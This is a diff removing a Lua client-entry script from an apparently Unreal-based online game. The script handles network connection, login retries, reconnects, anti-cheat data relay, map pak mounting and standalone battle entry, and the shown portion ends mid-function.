@@ -1,2254 +1,3 @@
-_G.Net = _G.ScriptHelperNetInterface
-_G.Client = _G.ScriptHelperClient
-_G.Tss = _G.TssManager
-if not Client then
-  return
-end
-require("client.slua.logic.HDmpveRemote.HDmpveRemote")
-slua.RegCustomErrorTraceback()
-if (IsEditor or IsWoWEditor) and Client.IsDevelopment() then
-  GameInstanceID = GameInstanceID or 0
-  if _G.IsEnableMockGameSvr then
-    GameInstanceID = GameInstanceID + 1
-  end
-  require("blacklist.LuaPanda").start("127.0.0.1", 8818 + GameInstanceID)
-end
-
-function Client.GetTable(...)
-  error("Use CDataTable.GetTable instead!")
-end
-
-function Client.GetTableData(...)
-  error("Use CDataTable.GetTableData instead!")
-end
-
-Client.bEditorSkipDownload = IsEditor and not Client.IsSplitMapPakVersion()
-if not Client.IsShipping() then
-else
-  function assert(condition, msg)
-    if not condition then
-      msg = msg or "assertion failed!"
-      
-      local utility = require("common.utility")
-      utility.ErrorMessageHandler(msg)
-      return false
-    end
-    return true
-  end
-end
-local GisInWaiting = false
-require("client.config.global")
-require("common.log")
-require("common_ustruct")
-require("client.common.game_status")
-require("common.gc_util")
-require("client.slua.config.sound_config")
-require("client.logic.ClientEntry.require_old_files")
-if Client.IsDevelopment() then
-  require("client.logic.gm.RequireBlackList")
-  local LuaAPITimeTracer = RequireBlackList("blacklist.editor.runtime_check.LuaAPITimeTracer")
-  if LuaAPITimeTracer then
-    log(bWriteLog and "Client_entry StartTracer")
-    LuaAPITimeTracer.StartTracer()
-  end
-end
-if not Client.IsReleaseVersion(NetInterface) then
-  require("blacklist.tools.ScreenShotReport.ScreenShotReport")
-end
-_G.UnrealNet = UnrealNet or {}
-_G.NetUtil = NetUtil or {
-  s2cNeedWaiting = {},
-  tNetDisconnected = 0,
-  tNetConnecting = 0,
-  tNetConnected = 0,
-  nDSTimeOutShowBitMask = 0,
-  DSTimeOutLong = 1,
-  DSTimeOutShort = 2,
-  NetUnstableReport = {
-    Enabled = false,
-    HistoryMaxSize = 128,
-    History = {},
-    HistoryHeadIndex = 1,
-    HistoryCount = 0,
-    LastRecordedUnstable = nil
-  }
-}
-local EventSystem = require("client.common.event.EventSystem")
-local xpcall = xpcall
-local utility = require("common.utility")
-local xpcallHandle = utility.ErrorMessageHandler
-local TimeUtil = require("client.common.time_util")
-local EmulatorSystem = require("client.logic.login.logic_emulator")
-local NetManager = require("client.network.comm.NetManager")
-local NetHeartBeatHandler = require("client.network.Protocol.NetHeartBeatHandler")
-local PublishRegionMacros = require("client.slua.config.ClientMacros.PublishRegionMacros")
-NetUtil.ConnectSDKTimeOutSeconds = 15
-NetUtil.ConnectLuaTimeOutSeconds = 20
-NetUtil.SendTime = NetUtil.SendTime or 0
-NetUtil.SendOneTime = NetUtil.SendOneTime or 0
-NetUtil.LobbyDelaySendTime = NetUtil.LobbyDelaySendTime or 0
-NetUtil.LobbyDelayRecvTime = NetUtil.LobbyDelayRecvTime or 0
-NetUtil.gameTick = NetUtil.gameTick or false
-NetUtil.showConnectionMsgTimes = NetUtil.showConnectionMsgTimes or 0
-NetUtil.hasTryConnectForNetworkError = NetUtil.hasTryConnectForNetworkError or false
-NetUtil.hasTryConnectForNetworkErrorTimes = NetUtil.hasTryConnectForNetworkErrorTimes or 0
-NetUtil.isWattingDelayReconnect = NetUtil.isWattingDelayReconnect or false
-NetUtil.checkWaitingReEnterGameNotify = NetUtil.checkWaitingReEnterGameNotify or false
-NetUtil.waitingReEnterGameStartTime = NetUtil.waitingReEnterGameStartTime or 0
-NetUtil.checkConnectingInFighting = false
-NetUtil.checkConnectingInFightingTimes = 0
-NetUtil.checkConnectingInFightingRandomInterval = 0
-NetUtil.waitingConnectSuccessStartTime = NetUtil.waitingConnectSuccessStartTime or 0
-NetUtil.checkEnterBattle = false
-NetUtil.waitingEnterBattleStartTime = NetUtil.waitingEnterBattleStartTime or 0
-NetUtil.LoadingTimeOut = 70
-NetUtil.EnterBattleLoadingTime = 0
-NetUtil.checkLoginOtherLobbyServer = false
-NetUtil.checkLoginRsp = NetUtil.checkLoginRsp or false
-NetUtil.checkLoginRetryTime = NetUtil.checkLoginRetryTime or 0
-NetUtil.checkBattleLoginRetryTime = NetUtil.checkBattleLoginRetryTime or 0
-NetUtil.sendLoginTime = NetUtil.sendLoginTime or 0
-NetUtil.dsTimeOutRetryTimes = NetUtil.dsTimeOutRetryTimes or 0
-NetUtil.dsTimeOutTipsUIShowing = NetUtil.dsTimeOutTipsUIShowing or false
-NetUtil.CurTickTime = NetUtil.CurTickTime or 0
-NetUtil.LastTickTime = NetUtil.LastTickTime or 0
-NetUtil.needInitCentauriWhenLogin = NetUtil.needInitCentauriWhenLogin or false
-NetUtil.noRefreshLogout = NetUtil.noRefreshLogout or false
-NetUtil.LobbyResultMonitor = NetUtil.LobbyResultMonitor or {
-  gameover = false,
-  gamemode = "",
-  lobbyReconnTimes = 0
-}
-NetUtil.ResultMonitorStarTime = 0
-NetUtil.BResultMonitorOpen = false
-NetUtil.BBattleResultRecieved = false
-NetUtil.PleaseReloginTimer = nil
-NetUtil.EnterBattleGameID = ""
-NetUtil.STOP_CONNECT = false
-NetUtil.EnterBattleTimeOutGameID = 0
-NetUtil.EnterBattleStageDelegate = nil
-NetUtil.EnterBattleTime = 0
-
-function OnClientGameOver()
-  local logic_enter_game = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.logic_enter_game)
-  local game_mode = logic_enter_game:GetSubModeId()
-  log(bWriteLog and "OnClientGameOver  mapMode:" .. game_mode .. "NetUtil.BBattleResultRecieved:" .. tostring(NetUtil.BBattleResultRecieved))
-  if NetUtil.BBattleResultRecieved then
-    return
-  end
-  ResetResultMonitor()
-  NetUtil.BResultMonitorOpen = true
-  NetUtil.ResultMonitorStarTime = TimeUtil.OSTime()
-  NetUtil.LobbyResultMonitor.gameover = true
-  NetUtil.LobbyResultMonitor.gamemode = game_mode
-end
-
-function ResetResultMonitor()
-  NetUtil.ResultMonitorStarTime = 0
-  NetUtil.BResultMonitorOpen = false
-  NetUtil.LobbyResultMonitor = {
-    gameover = false,
-    gamemode = 0,
-    lobbyReconnTimes = 0
-  }
-  log_tree("ClientEntry ----- ResetResultMonitor", NetUtil.LobbyResultMonitor)
-end
-
-function UpdateResultMonitor()
-  if not NetUtil.BResultMonitorOpen then
-    return
-  end
-  if not NetUtil.LobbyResultMonitor then
-    return
-  end
-  if not NetUtil.LobbyResultMonitor.gameover then
-    return
-  end
-  if TimeUtil.OSTime() - NetUtil.ResultMonitorStarTime < 2 then
-    return
-  end
-  NetUtil.ResultMonitorStarTime = TimeUtil.OSTime()
-  NetUtil.LobbyResultMonitor.lobbyReconnTimes = NetUtil.LobbyResultMonitor.lobbyReconnTimes + 1
-  if NetUtil.LobbyResultMonitor.lobbyReconnTimes < 5 then
-    return
-  end
-  if Client.IsEditorDedicatedServer() then
-    log(bWriteLog and "ClientEntry ----- UpdateResultMonitor IsEditorDedicatedServer return")
-    return
-  end
-  log(bWriteLog and "ClientEntry ----- UpdateResultMonitor  Force back to lobby")
-  local strTile = LocUtil.GetLocalizeResStr(102012)
-  local strMsg = LocUtil.GetLocalizeResStr(77010)
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  CommonMsgBoxMgr.Show(1, strTile, strMsg, function()
-    if GameStatus.IsInFightingStatus() then
-      FuncUtil.ShowLoadingToLobby()
-      Client.ReturnToLobby(GameFrontendHUD)
-      Client.TPerforPlatDisconnectReport(GameFrontendHUD, 17)
-      local param = {}
-      NetUtil.GEMReportSubEvent("NoConnectWhenResult", param)
-      local ClientTLogManager = SubsystemMgr:Get("ClientTLogManager")
-      if ClientTLogManager then
-        local Data = {}
-        ClientTLogManager:SendReportLobby("NoConnectWhenResult", Data, false)
-      end
-    end
-  end)
-  ResetResultMonitor()
-  return
-end
-
-function Tick(DeltaTime)
-  NetUtil.CurTickTime = NetUtil.CurTickTime + DeltaTime
-  TimeUtil.nLocalTimeTick = TimeUtil.nLocalTimeTick + DeltaTime
-  if NetUtil.CurTickTime - NetUtil.LastTickTime > 5 then
-    NetUtil.LastTickTime = NetUtil.CurTickTime
-  end
-  NetUtil.CheckTime()
-  NetUtil.OnTick(TimeUtil.OSTime())
-  EmulatorSystem.Tick(DeltaTime)
-end
-
-function NetUtil.GEMReportSubEvent(SubEventName, array)
-  return Client.GEMReportSubEvent(GameFrontendHUD, "BattleNetworkEvent", SubEventName, array)
-end
-
-function NetUtil.DispatchPacket(msg, ...)
-  local proc = NetManager.ProcRespondMsg
-  if not proc then
-    log_error(string.format("undefined msg: %s", msg))
-    return
-  end
-  xpcall(proc, xpcallHandle, msg, ...)
-end
-
-function NetUtil.SendTss()
-  if Tss then
-    Tss.SendSkdData(LuaStateWrapper, NetInterface, "on_recv_client_data")
-  else
-    log_shipping_client("NetUtil.SendTss Tss is nil")
-  end
-end
-
-function NetUtil.OnTssRsp(datalen, data)
-  if Tss then
-    Tss.OnRecvData(datalen, data)
-  else
-    log_shipping_client("NetUtil.OnTssRsp Tss is nil")
-  end
-end
-
-local function FindInvalidArchiveType(value, path, depth)
-  local t = type(value)
-  if t == "number" or t == "string" or t == "boolean" or t == "nil" then
-    return nil
-  elseif t == "table" then
-    if 32 < depth then
-      return (path or "?") .. " (table too deep)"
-    end
-    for k, v in pairs(value) do
-      local kt = type(k)
-      if kt ~= "number" and kt ~= "string" then
-        return string.format("%s[<key type=%s>]", path or "?", kt)
-      end
-      local bad = FindInvalidArchiveType(v, (path or "") .. "." .. tostring(k), depth + 1)
-      if bad then
-        return bad
-      end
-    end
-    return nil
-  else
-    return string.format("%s (type=%s)", path or "?", t)
-  end
-end
-
-function NetUtil.SendPkg(msgName, ...)
-  if NetManager and NetManager.isLogMsgAfterLogin then
-    if NetManager.logMsgMap[msgName] then
-      NetManager.logMsgMap[msgName] = NetManager.logMsgMap[msgName] + 1
-    else
-      NetManager.logMsgMap[msgName] = 1
-    end
-  end
-  local nArgs = select("#", ...)
-  for i = 1, nArgs do
-    local arg = select(i, ...)
-    local bad = FindInvalidArchiveType(arg, "arg" .. i, 0)
-    if bad then
-      log_error(string.format([[
-NetUtil.SendPkg drop pkg msg=%s invalid archive type at %s
-%s]], tostring(msgName), bad, debug and debug.traceback and debug.traceback("", 2) or ""))
-      return
-    end
-  end
-  if Client.IsConnected(NetInterface) then
-    Net.SendPacket(LuaStateWrapper, NetInterface, msgName, ...)
-  else
-    log_shipping_client("ClientEntry -----  connection is failed throw pkg " .. msgName)
-  end
-end
-
-function NetUtil.ConnectToURL(ip)
-  if not ip then
-    return
-  end
-  if Client.IsDevelopment() and NetUtil.STOP_CONNECT then
-    log(bWriteLog and "NetUtil.ConnectToURL SWITCH TEST RETURN")
-    return
-  end
-  local EnableDNS = HDmpveRemote.HDmpveRemoteConfigGetString("HTTPDNS", "")
-  if EnableDNS ~= "EnableHTTPDNS" then
-    return NetUtil.ConnectToURLDirectly(ip)
-  else
-    return NetUtil.ConnectToURLWithDNSProxy(ip)
-  end
-end
-
-function NetUtil.ConnectToURLDirectly(ip)
-  log(bWriteLog and "NetUtil.ConnectToURLDirectly, url = " .. tostring(ip) .. ", time = " .. tostring(TimeUtil.OSTime()))
-  log_shipping_client("[Login process] NetUtil.ConnectToURL " .. ", time" .. tostring(TimeUtil.OSTime()))
-  NetUtil.SetWindowEditorLoginTokenIndex()
-  Client.ConnectToURL(NetInterface, ip, NetUtil.ConnectSDKTimeOutSeconds)
-  local logic_lobby_ping_report = require("client.slua.logic.match.logic_lobby_ping_report")
-  logic_lobby_ping_report.OnSendConnectToURL()
-end
-
-function NetUtil.SetWindowEditorLoginTokenIndex()
-  local DevicePlatformNameMacros = require("client.slua.config.ClientMacros.DevicePlatformNameMacros")
-  if DevicePlatformNameMacros.IsPC() then
-    local IMSDKHelper = import("IMSDKHelper")
-    local IMSDKHelperInstance = IMSDKHelper.GetInstance()
-    if IMSDKHelperInstance.SetWindowEditorLoginTokenIndex then
-      IMSDKHelperInstance:SetWindowEditorLoginTokenIndex(GameInstanceID)
-    end
-  end
-end
-
-function NetUtil.ConnectToURLWithDNSProxy(ip)
-  local DNSServerIP = HDmpveRemote.HDmpveRemoteConfigGetString("HTTPDNSServerIP", "")
-  Client.ConnectToURLWithDNSProxy(NetInterface, DNSServerIP, ip, NetUtil.ConnectSDKTimeOutSeconds)
-  local logic_lobby_ping_report = require("client.slua.logic.match.logic_lobby_ping_report")
-  logic_lobby_ping_report.OnSendConnectToURL()
-end
-
-function NetUtil.Disconnect()
-  log_shipping_client("ClientEntry ----- NetUtil.Disconnect()")
-  Client.Disconnect(NetInterface)
-end
-
-function NetUtil.MountPakOfMode(sub_mode, ugc_map_id)
-  local MatchModeMgrSystem = require("client.slua.logic.match.logic_mode_mgr")
-  local mapKey = MatchModeMgrSystem.GetMapKeyBySubMode(sub_mode, ugc_map_id)
-  local PufferTlog = require("client.slua.logic.download.report.puffer_tlog")
-  log(bWriteLog and "SubMode: " .. tostring(sub_mode))
-  Client.AddAttachFileString("mountmodpaks", true, "sub_mode:" .. tostring(sub_mode) .. " mapKey:" .. tostring(mapKey))
-  if mapKey then
-    local mapFiles = {}
-    local PufferMapManager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.puffer_map_manager)
-    mapFiles = PufferMapManager:GetDependMapFiles(mapKey, sub_mode, ugc_map_id)
-    for i in pairs(mapFiles) do
-      log(bWriteLog and string.format("NetUtil.MountPakOfMode mapFileName:%s", i))
-    end
-    local mapKeys = {}
-    if mapFiles and next(mapFiles) then
-      for filename, key in pairs(mapFiles) do
-        mapKeys[key] = true
-        local path = Client.ProjectSavedDir() .. "Paks/" .. filename
-        if not Client.IsFileExistsWithOutPakCheck(path) then
-          PufferTlog.SendTLog(PufferTlog.Enum_TLog_From.MissingPak, PufferTlog.Enum_TLog_Optype.Finish, filename)
-          local mountResult = " Path:" .. path .. " not exist!"
-          Client.AddAttachFileString("mountmodpaks", false, mountResult)
-          local StringUtil = require("common.string_util")
-          local splits = StringUtil.Split(filename, ".")
-          if splits[1] and splits[2] then
-            local pre = splits[1] .. "." .. splits[2]
-            local ret = GCPufferDownloader.ReturnLocalFiles(PufferDownloader.DOWNLOAD_DIR_RELATIVE, "")
-            local replaceFileName = ""
-            for _, localFileName in pairs(ret) do
-              if string.find(localFileName, pre) and (replaceFileName == "" or localFileName > replaceFileName) then
-                replaceFileName = localFileName
-              end
-            end
-            if replaceFileName ~= "" then
-              path = Client.ProjectSavedDir() .. "Paks/" .. replaceFileName
-              if not Client.IsMounted(path) then
-                Client.MountPakFile(path, "")
-              end
-            end
-          end
-        else
-          local mountResult = " Path:" .. path
-          if not Client.IsMounted(path) then
-            local success = Client.MountPakFile(path, "")
-            log(bWriteLog and "Start to mount " .. tostring(path) .. tostring(success))
-            mountResult = mountResult .. " mounted " .. tostring(success)
-            Client.AddAttachFileString("mountmodpaks", false, mountResult)
-          else
-            log(bWriteLog and "Already mounted " .. tostring(path))
-            mountResult = mountResult .. " Already mounted."
-            Client.AddAttachFileString("mountmodpaks", false, mountResult)
-          end
-        end
-      end
-    end
-    PufferMapManager:MountFeaturesODPak(mapKey, sub_mode)
-    PufferMapManager:RecordDynamicPaks(mapKeys)
-  end
-  local AkGameplayStatics = import("AkGameplayStatics")
-  AkGameplayStatics.RefreshModDirectories()
-end
-
-function NetUtil.EnterBattleStandAlone(GameFrontendHUD, map_path, _player_key, nickName, sub_mode, dynamiclevels_op, AdditionalURLSuffixes)
-  if AdditionalURLSuffixes == nil then
-    AdditionalURLSuffixes = ""
-  else
-    local AdditionalURLSuffixesHead = "?"
-    if AdditionalURLSuffixes:sub(1, 1) ~= AdditionalURLSuffixesHead then
-      AdditionalURLSuffixes = AdditionalURLSuffixesHead .. AdditionalURLSuffixes
-    end
-  end
-  NetUtil.MountPakOfMode(sub_mode)
-  _G.ModeID = sub_mode
-  local ScriptHelperClient = import("ScriptHelperClient")
-  ScriptHelperClient.EnterBattleStandAlone(GameFrontendHUD, map_path, _player_key, nickName, dynamiclevels_op, AdditionalURLSuffixes, sub_mode)
-  local UIUtil = require("client.common.ui_util")
-  if UIUtil.GetGameFrontendHUD() ~= nil then
-    UIUtil.GetGameFrontendHUD():SetGameSubMode(tostring(sub_mode))
-  end
-end
-
-function NetUtil.SetEnterBattleGameID(InGameID)
-  if InGameID ~= nil and NetUtil.EnterBattleGameID ~= InGameID then
-    NetUtil.EnterBattleGameID = InGameID
-    log_shipping_client("LogBattleNetFlow,  GameId: " .. tostring(InGameID))
-  end
-end
-
-function NetUtil.OnConnected(isConnected, nReason)
-  if _G.IsEnableMockGameSvr then
-    log(bWriteLog and "NetUtil.OnConnected(IsEnableMockGameSvr)")
-    return
-  end
-  local logic_lobby_ping_report = require("client.slua.logic.match.logic_lobby_ping_report")
-  logic_lobby_ping_report.OnReceiveConnected(isConnected)
-  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-  log(bWriteLog and "NetUtil.OnConnected, isConnected = " .. tostring(isConnected) .. ", reason = " .. tostring(nReason) .. ", status = " .. GameStatus.GetGameStatus() .. ", ReceivedSyncBaseInfo = " .. tostring(login_module.bIsInitLogin))
-  log_shipping_client("[Login process] ClientEntry -----  NetUtil.OnConnected " .. tostring(isConnected) .. ", nReason: " .. nReason .. ", isInitLogin:" .. tostring(login_module.bIsInitLogin))
-  if not isConnected then
-    local IntlHelper = import("IntlHelper")
-    IntlHelper.AddErrorCodeToHistory(string.format("connect-%s", tostring(nReason)))
-    local PlayerPrefsSystem = require("client.logic.LogicPlayerPrefs.playerprefs")
-    local info = {reason = nReason}
-    PlayerPrefsSystem.SaveTableToFile_N(info, PlayerPrefsSystem.ePlayerPrefsType.eLoginHDmpveErr)
-  end
-  if Client.SetTssNetworkStatus ~= nil then
-    if isConnected then
-      Client.SetTssNetworkStatus(GameFrontendHUD, 0)
-    elseif nReason == 100 then
-      Client.SetTssNetworkStatus(GameFrontendHUD, nReason)
-    end
-  end
-  local ban_login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.ban_login_module)
-  local bKickOutSelf = ban_login_module.hasKickOut or login_module.bHasLogout or NetUtil.checkLoginOtherLobbyServer
-  if isConnected == false and (GameStatus.GetGameStatus() == GameStatus.Login or GameStatus.IsInLobbyOrMainCity()) and bKickOutSelf == false then
-    if login_module:reconnectGateway() then
-      log(bWriteLog and "ClientEntry -----  LoginSystem.reconnectGateway()")
-      return
-    else
-      Client.GEMReportEnterLobbyEvent(GameFrontendHUD, false, "reconnect backup server failed, errorcode:" .. tostring(nReason))
-    end
-  elseif isConnected == false and bKickOutSelf == false then
-    Client.GEMReportEnterLobbyEvent(GameFrontendHUD, false, tostring(nReason))
-  end
-  if not NetUtil.checkLoginOtherLobbyServer then
-    logic_connection_waiting:Hide(1)
-  end
-  NetManager.ProcConnected(isConnected)
-  local nowTime = TimeUtil.GetServerTimeInSec()
-  if isConnected then
-    log(bWriteLog and "ClientEntry ----- NetUtil.OnConnected step isConnected")
-    log(bWriteLog and string.format("ClientEntry ----- NetUtil.OnConnected nowTime = %s", TimeUtil.FormatTime_YMDHMS(nowTime)))
-    NetUtil.hasTryConnectForNetworkError = false
-    NetUtil.hasTryConnectForNetworkErrorTimes = 0
-    if GisInWaiting then
-      log(bWriteLog and "ClientEntry ----- is in LoginSystem.GisInWaiting")
-      local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-      CommonMsgBoxMgr.HideAllPanel()
-    end
-    local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-    log(bWriteLog and "ClientEntry ----- Close ConnectionMessageBoxUI!!!!")
-    CommonMsgBoxMgr.HideConnectionPanel()
-    local LogicFitVersionDownload = require("client.slua.logic.download.fit.logic_fitVersion_download")
-    LogicFitVersionDownload.TryReshowDeleteRestartHint("OnConnected")
-    if ban_login_module.hasKickOut then
-      NetUtil.gameTick = false
-    else
-      if Client.IsMatchNoAuthMode and Client.IsMatchNoAuthMode() then
-        if login_module.bIsInitLogin == false and GameStatus.GetGameStatus() == GameStatus.Login then
-          login_module:competition_login_res(true)
-        else
-          login_module:TryNoAuthRelogin()
-        end
-      else
-        login_module:OnConnected(NetUtil.ConnectReason)
-        NetUtil.ConnectReason = nil
-      end
-      NetUtil.ClearAutoReconnectParam()
-      NetUtil.gameTick = true
-    end
-    NetUtil.showConnectionMsgTimes = 0
-    NetUtil.SendTime = TimeUtil.OSTime()
-    NetUtil.LobbyDelaySendTime = TimeUtil.GetMiliseconds()
-    NetUtil.LobbyDelayRecvTime = TimeUtil.GetMiliseconds()
-    NetUtil.s2cNeedWaiting = {}
-    NetUtil.checkConnectingInFighting = false
-    NetUtil.checkConnectingInFightingTimes = 0
-    log(bWriteLog and "ClientEntry ----- NetUtil.OnConnected step isConnected EVENTID_LOBBY_SERVER_CONNECT_SUCCESS")
-    EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_LOBBY_SERVER_CONNECT_SUCCESS)
-  else
-    local login_protect_utils = require("client.slua.logic.login.login_protect_utils")
-    login_protect_utils.RecordLoginFailTime()
-    log_shipping_client("ClientEntry ----- NetUtil.OnConnected Failed curStatus = " .. GameStatus.GetGameStatus() .. " for reason = " .. nReason)
-    EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_LOBBY_SERVER_CONNECT_FAILED)
-    if ban_login_module.hasKickOut or login_module.bHasLogout or NetUtil.checkLoginOtherLobbyServer then
-      log_format("ClientEntry ----- NetUtil.OnConnected kickout or logout state! hasKickOut:%s, hasLogout:%s, checkLoginOtherLobbyServer:%s", ban_login_module.hasKickOut, login_module.bHasLogout, NetUtil.checkLoginOtherLobbyServer)
-      log_shipping_client("ClientEntry ----- NetUtil.OnConnected tryConnectLobby failed is in kickout or logout state! hasKickOut:" .. tostring(ban_login_module.hasKickOut) .. ", hasLogout:" .. tostring(login_module.bHasLogout))
-      NetUtil.gameTick = false
-      return
-    end
-    local errorMsg = FuncUtil.GetHDmpveErrorMsg(nReason)
-    local isInFightingNotSocialNotMainCityNotHome = GameStatus.IsInFightingNotSocialNotMainCityNotHome()
-    log_format("NetUtil.OnConnected IsInFightingNotSocialNotMainCityNotHome = %s", isInFightingNotSocialNotMainCityNotHome)
-    if isInFightingNotSocialNotMainCityNotHome then
-      if not NetUtil.checkConnectingInFighting then
-        NetUtil.checkConnectingInFighting = true
-        NetUtil.waitingConnectSuccessStartTime = TimeUtil.OSTime()
-        log(bWriteLog and "ClientEntry ----- NetUtil.OnConnected waitingConnectSuccessStartTime:" .. NetUtil.waitingConnectSuccessStartTime)
-      end
-    else
-      local gclould_error_define = require("client.common.gclould_error_define")
-      if nReason == -1 or nReason == gclould_error_define.GCLOULD_ErrorNetworkException or nReason == gclould_error_define.GCLOULD_ErrorTimeout or nReason == gclould_error_define.GCLOULD_ErrorChecking or nReason == gclould_error_define.GCLOULD_ErrorConnectFailed then
-        if not NetUtil.AutoReconnectParam then
-          NetUtil.AutoReconnectParam = NetUtil.GetAutoReconnectParam()
-          if NetUtil.AutoReconnectParam.showFunc then
-            NetUtil.AutoReconnectParam.showFunc()
-          end
-        end
-        log_format("ClientEntry ----- NetUtil.OnConnected AutoReconnectTimes = %s, hasTryConnectForNetworkErrorTimes = %s nowTime = %s", NetUtil.AutoReconnectParam.times, NetUtil.hasTryConnectForNetworkErrorTimes, TimeUtil.FormatTime_YMDHMS(nowTime))
-        if NetUtil.hasTryConnectForNetworkErrorTimes < NetUtil.AutoReconnectParam.times then
-          log(bWriteLog and "ClientEntry ----- After Connect Failed For Newwork Try Connect One Time......")
-          if NetUtil.isWattingDelayReconnect == false then
-            NetUtil.isWattingDelayReconnect = true
-            NetUtil.ClearAutoReconnectTimer()
-            NetUtil.hasTryConnectForNetworkErrorTimes = NetUtil.hasTryConnectForNetworkErrorTimes + 1
-            local timer_ticker = require("common.time_ticker")
-            NetUtil.autoReconnectTimer = timer_ticker.AddTimerOnce(1, function()
-              log(bWriteLog and "ClientEntry ----- NetUtil.OnConnected Auto Reconnect Timer handler")
-              NetUtil.tryConnect(Enum_LOGIN_REPORT_CFG.NET_CONNECT_ERR)
-              NetUtil.isWattingDelayReconnect = false
-            end)
-          end
-        else
-          NetUtil.ClearAutoReconnectParam()
-          log(bWriteLog and "ClientEntry ----- Show ConnectingErrorMsg ......")
-          NetUtil.showConnectionMsgTimes = NetUtil.showConnectionMsgTimes + 1
-          NetUtil.ShowConnectionMsgBox(NetUtil.showConnectionMsgTimes, errorMsg)
-        end
-      else
-        NetUtil.gameTick = false
-        local strTile = LocUtil.GetLocalizeResStr(102012)
-        if not login_module.bLoginNextRsp then
-          local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-          CommonMsgBoxMgr.Show(1, strTile, errorMsg, function()
-            if nReason == gclould_error_define.GCLOULD_ErrorAuthFailed then
-              local SettingAccount = require("client.logic.setting.logic_setting_account")
-              SettingAccount.ClientLogout()
-            end
-            login_module:backLogin()
-          end, nil, nil, nil, true)
-        end
-      end
-      ResetResultMonitor()
-    end
-  end
-  local param = {}
-  table.insert(param, isConnected)
-  table.insert(param, nReason)
-  EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_CONNECTED, param)
-end
-
-function NetUtil.OnStateChange(state, param1, param2, param3)
-  log_shipping_client("ClientEntry ----- OnStateChange State:" .. state .. ", Param1:" .. param1 .. ", Param2:" .. param2 .. ", Param3:" .. param3)
-  if state == 0 then
-    log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kConnectorStateRunning")
-  elseif state == 1 then
-    log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kConnectorStateReconnecting.......")
-    NetUtil.ProcOnConnecting()
-  elseif state == 2 then
-    log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kConnectorStateReconnected isConnect:" .. param1)
-    NetUtil.ProcOnConnected()
-    if NetUtil.CheckSpecialDeviceNetFlash() then
-      log(bWriteLog and "NetUtil.OnStateChange check special device net flash")
-      logic_connection_waiting:Hide(1)
-    else
-      NetUtil.OnConnected(param1 == 0, param1)
-    end
-  elseif state == 3 then
-    log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kConnectorStateStayInQueue")
-    local queuePosition = param1
-    local queueLength = param2
-    local estimateTime = param3
-    log(bWriteLog and string.format("Queue, current position:%d of total quque length:%d,estimateTime=%d", queuePosition, queueLength, estimateTime))
-    GisInWaiting = true
-    NetUtil.gameTick = false
-    local cancelWaiting = function()
-      log(bWriteLog and "ClientEntry ----- cancelWaiting..")
-      local login = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-      login:backLogin()
-    end
-    local timewait = math.floor(estimateTime / 60)
-    local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-    CommonMsgBoxMgr.HideAllPanel()
-    if not GameStatus.IsInFightingNotSocialNotMainCityNotHome() then
-      local str = LocUtil.GetLocalizeResStr(301108)
-      local str2 = LocUtil.GetLocalizeResStr(301109)
-      local str3 = LocUtil.GetLocalizeResStr(110035)
-      local text = string.format(str, queuePosition, timewait)
-      CommonMsgBoxMgr.Show(1, str2, text, cancelWaiting, nil, str3)
-    end
-  elseif state == 4 then
-    log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kConnectorStateError ")
-    NetUtil.ProcOnDisconnected()
-    local errorCode = param1
-    log(bWriteLog and "ClientEntry ----- errorCode == " .. errorCode)
-    if errorCode == 2 then
-      local AccelSystem = require("client.slua.logic.gamemaster.logic_accel")
-      if AccelSystem.IsEnableAccel() then
-        AccelSystem.Switch2FastMode()
-      end
-    end
-    if errorCode == 207 or errorCode == 205 then
-      log(bWriteLog and "ClientEntry ----- HDmpve::Conn::kErrorSendError")
-      NetUtil.OnConnected(false, 201)
-    else
-      if param2 == 7 then
-        log(bWriteLog and "ClientEntry ----- 后台主动将客户端踢下线")
-        log(bWriteLog and "ClientEntry ----- extendCodeOfGameSvr = " .. param3)
-      else
-        log(bWriteLog and "ClientEntry ----- extend = " .. param2 .. "extend2 = " .. param3)
-      end
-      NetUtil.OnConnected(false, errorCode)
-    end
-  end
-end
-
-function NetUtil.OnDisconnected(nReason)
-  log_error("NetUtil.OnDisconnected nReason：" .. nReason)
-  log(bWriteLog and "ClientEntry ----- NetUtil.OnDisconnected nReason：" .. nReason)
-end
-
-NET_UTIL_LOGIN_WAIT_TIME = 8
-
-function NetUtil.CheckTime()
-  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-  if NetUtil.checkLoginRsp and NetUtil.sendLoginTime > 0 and TimeUtil.OSTime() - NetUtil.sendLoginTime >= NET_UTIL_LOGIN_WAIT_TIME then
-    if NetUtil.checkLoginRetryTime == 0 then
-      log(bWriteLog and "ClientEntry -----  checkLoginRsp timeout!! " .. NetUtil.checkLoginRetryTime .. ", isRelogin:" .. tostring(login_module.bIsRelogin))
-      local reportId = Enum_LOGIN_REPORT_CFG.RETRY
-      if login_module.bLoginNextRsp then
-        reportId = Enum_LOGIN_REPORT_CFG.LOGIN_NEXT
-        login_module:SetbLoginNextRsp(false)
-      end
-      login_module:reqLoginLobby(login_module.bIsRelogin, reportId)
-      NetUtil.checkLoginRetryTime = NetUtil.checkLoginRetryTime + 1
-    else
-    end
-    if GameStatus.IsInFightingNotSocialNotMainCityNotHome() then
-      if NetUtil.checkBattleLoginRetryTime == 0 or NetUtil.checkBattleLoginRetryTime == 2 or NetUtil.checkBattleLoginRetryTime == 5 then
-        log(bWriteLog and "ClientEntry ----- tryConnect lobby in fighting when login failed")
-        NetUtil.tryConnect(Enum_LOGIN_REPORT_CFG.NET_CONNECT_FRIGHT_TICK)
-      end
